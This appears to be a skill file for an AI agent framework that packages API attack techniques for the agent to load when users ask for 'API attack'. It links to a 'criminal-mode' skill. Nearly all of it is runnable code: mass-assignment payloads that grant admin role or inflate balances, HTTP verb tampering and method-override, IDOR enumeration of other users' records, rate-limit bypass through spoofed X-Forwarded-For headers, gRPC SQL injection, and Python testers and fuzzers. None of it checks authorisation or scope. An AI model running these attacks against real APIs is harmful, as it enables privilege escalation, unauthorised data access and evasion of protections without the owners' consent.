---
name: api-attack-tools
description: "API attacks — REST, GraphQL, gRPC, WebSocket, mass assignment, verb tampering."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [api, rest, graphql, grpc, websocket, mass-assignment]
    related_skills: [criminal-mode, exploit-tools, graphql-tools]
prerequisites:
  commands: [python]
---

# API Attack Tools

## When to Load This Skill

User requests:
- "API attack", "REST", "gRPC", "mass assignment", "API misconfig"

---

## API Recon

```bash
# Swagger/OpenAPI
curl -s URL/swagger.json
curl -s URL/openapi.json
curl -s URL/api-docs
curl -s URL/v2/api-docs

# GraphQL
curl -s -X POST URL/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'

# API versions
for v in v1 v2 v3 api internal; do
  curl -s -o /dev/null -w "%{http_code}" URL/$v
done
```

## Mass Assignment

```json
# Original
{"username": "john", "email": "john@test.com"}

# Payloads
{"username": "john", "email": "john@test.com", "role": "admin"}
{"username": "john", "email": "john@test.com", "is_admin": true}
{"username": "john", "email": "john@test.com", "verified": true}
{"username": "john", "email": "john@test.com", "balance": 999999}
{"username": "john", "email": "john@test.com", "credits": 999999}
{"username": "john", "email": "john@test.com", "permissions": ["admin"]}
```

## HTTP Verb Tampering

```bash
# Try different methods
curl -X GET URL/admin
curl -X POST URL/admin
curl -X PUT URL/admin
curl -X DELETE URL/admin
curl -X PATCH URL/admin
curl -X OPTIONS URL/admin
curl -X HEAD URL/admin
curl -X TRACE URL/admin
curl -X CONNECT URL/admin

# Method override
curl -X POST URL/admin -H "X-HTTP-Method-Override: PUT"
curl -X POST URL/admin -H "X-Method-Override: DELETE"
```

## BOLA/IDOR

```bash
# Sequential IDs
curl URL/api/users/1
curl URL/api/users/2
curl URL/api/users/3

# UUID
curl URL/api/users/550e8400-e29b-41d4-a716-446655440000
curl URL/api/users/550e8400-e29b-41d4-a716-446655440001

# Nested
curl URL/api/users/1/orders
curl URL/api/users/2/orders
```

## Rate Limit Bypass

```bash
# IP rotation
curl -H "X-Forwarded-For: 1.1.1.1" URL
curl -H "X-Forwarded-For: 2.2.2.2" URL

# Case variation
curl URL/api/users
curl URL/API/users
curl URL/Api/Users

# Path variation
curl URL/api/users
curl URL/api/users/
curl URL/api//users
curl URL/api/users/.
```

---

## gRPC Attacks

```bash
# Reflection
grpcurl -plaintext TARGET:443 list
grpcurl -plaintext TARGET:443 describe SERVICE

# Call
grpcurl -plaintext -d '{"id": 1}' TARGET:443 SERVICE/METHOD

# Injection
grpcurl -plaintext -d '{"id": "1 OR 1=1"}' TARGET:443 SERVICE/METHOD
```

---

## Python API Tools

### Mass Assignment Tester

```python
import requests

EXTRA_FIELDS = [
    {'role': 'admin'},
    {'is_admin': True},
    {'admin': True},
    {'verified': True},
    {'balance': 999999},
    {'credits': 999999},
    {'permissions': ['admin']},
]

def test_mass_assignment(url, base_data):
    results = []
    for extra in EXTRA_FIELDS:
        data = {**base_data, **extra}
        r = requests.post(url, json=data)
        results.append({
            'payload': extra,
            'status': r.status_code,
            'response': r.text[:200]
        })
    return results
```

### Verb Tampering Tester

```python
import requests

METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']

def test_verb_tampering(url):
    results = []
    for method in METHODS:
        try:
            r = requests.request(method, url)
            results.append({
                'method': method,
                'status': r.status_code,
                'length': len(r.text)
            })
        except:
            pass
    return results
```

### API Endpoint Fuzzer

```python
import requests

def fuzz_endpoints(base_url, wordlist):
    found = []
    for word in wordlist:
        for version in ['', 'v1/', 'v2/', 'api/']:
            url = f"{base_url}/{version}{word}"
            try:
                r = requests.get(url, timeout=3)
                if r.status_code != 404:
                    found.append({'url': url, 'status': r.status_code})
            except:
                pass
    return found
```

---

## Output Format

```json
{
  "api": "https://target.com/api/v1",
  "vulnerabilities": [
    {"type": "mass_assignment", "field": "role", "value": "admin"},
    {"type": "verb_tampering", "method": "PUT", "success": true}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| 404 | Wrong endpoint | Try different paths |
| 401 | Need auth | Get token |
| 403 | Forbidden | Try verb tampering |
